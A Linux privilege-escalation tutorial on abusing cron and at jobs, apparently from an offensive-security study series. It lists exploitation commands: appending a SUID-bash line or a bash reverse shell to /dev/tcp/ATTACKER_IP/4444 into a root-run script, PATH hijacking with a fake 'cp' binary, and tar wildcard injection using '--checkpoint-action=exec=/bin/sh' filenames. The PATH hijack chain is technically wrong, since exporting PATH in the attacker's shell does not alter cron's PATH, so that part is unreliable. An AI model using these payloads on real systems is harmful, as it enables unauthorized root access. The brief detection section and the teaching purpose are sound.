# 05. Scheduled Tasks and Jobs (Cron Abuse)

## Overview

Scheduled tasks and jobs are automated mechanisms used in Linux systems to execute scripts or commands at predefined intervals.

When misconfigured, they become a powerful privilege escalation vector because they often run with **root privileges** and execute **user-writable scripts or files**.

---

## 1. Cron Fundamentals

Cron is the most common scheduling service in Linux.

### View current user cron jobs:

```bash
crontab -l
```

---

### View system-wide cron jobs:

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*
```

---

### Example system cron entry:

```text
* * * * * root /opt/backup.sh
```

➡ This runs `/opt/backup.sh` as root every minute.

---

## 2. Key Enumeration Targets

During privilege escalation, focus on:

* `/etc/crontab`
* `/etc/cron.d/`
* `/etc/cron.hourly/`
* `/etc/cron.daily/`
* `/etc/cron.weekly/`
* `/var/spool/cron/`
* User crontabs

---

## 3. Writable Script Abuse

### Scenario

You find a cron job:

```text
root /opt/backup.sh
```

Check permissions:

```bash
ls -l /opt/backup.sh
```

If writable:

```text
-rw-rw-rw- 1 root root 1234 Jun 6 /opt/backup.sh
```

➡ This is a critical misconfiguration.

---

### Exploitation

Inject malicious command:

```bash
echo "/bin/bash -c 'chmod +s /bin/bash'" >> /opt/backup.sh
```

or reverse shell:

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/backup.sh
```

➡ Next execution = root code execution

---

## 4. PATH Hijacking in Cron Jobs

Cron jobs often use a limited PATH environment.

### Example cron entry:

```text
root /usr/local/bin/cleanup
```

If script uses:

```text
cp
rm
tar
```

without full paths → PATH hijacking possible.

---

### Exploitation Steps

#### Step 1: Create malicious binary

```bash
mkdir /tmp/evil
echo "/bin/bash" > /tmp/evil/cp
chmod +x /tmp/evil/cp
```

---

#### Step 2: Modify PATH

```bash
export PATH=/tmp/evil:$PATH
```

---

#### Step 3: Wait for cron execution

When cron runs:

```text
cp file1 file2
```

➡ It executes attacker-controlled `/tmp/evil/cp`

➡ Root shell

---

## 5. Wildcard Injection in Cron Jobs

Some cron scripts use unsafe wildcards.

### Example:

```text
tar -cf backup.tar *
```

If directory is writable → attacker can inject files.

---

### Exploitation idea:

Create files with special names:

```bash
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=/bin/sh
```

➡ tar interprets them as options → command execution

---

## 6. User Cron Jobs (Less common but useful)

```bash
crontab -l
```

If user cron runs scripts that are:

* writable
* in shared directories
* or using insecure paths

➡ privilege escalation chain possible

---

## 7. At Jobs (One-time scheduled tasks)

Check queued jobs:

```bash
atq
```

View job content:

```bash
at -c <job_id>
```

If scripts are writable → same exploitation logic applies.

---

## 8. Real-World Privilege Escalation Chains

### Chain 1: Writable Cron Script

1. Find `/opt/backup.sh`
2. Confirm cron runs as root
3. Inject payload
4. Wait for execution
5. Gain root shell

---

### Chain 2: PATH Hijack via Cron

1. Identify cron job using system binaries
2. Create fake binary in writable directory
3. Modify PATH
4. Wait for cron execution
5. Root compromise

---

### Chain 3: Wildcard Injection

1. Identify unsafe tar/rsync usage
2. Create malicious filenames
3. Wait for scheduled execution
4. Command execution as root

---

## 9. Detection & Defensive Perspective

Monitor for:

* modifications to cron files
* changes in `/etc/crontab`
* unexpected script edits in `/opt`, `/usr/local`
* creation of suspicious files in cron directories
* abnormal execution of system scripts

---

## Key Mindset

When analyzing scheduled tasks, always ask:

* What runs as root automatically?
* Is the script writable?
* Does it use unsafe commands?
* Can I control input files or directories?
* Can I hijack PATH or binaries?

---

## Summary

Scheduled tasks are dangerous because:

> They execute automatically with elevated privileges, often trusting user-writable scripts or unsafe environment configurations.

This makes cron-based privilege escalation one of the most consistent real-world attack vectors in Linux systems.
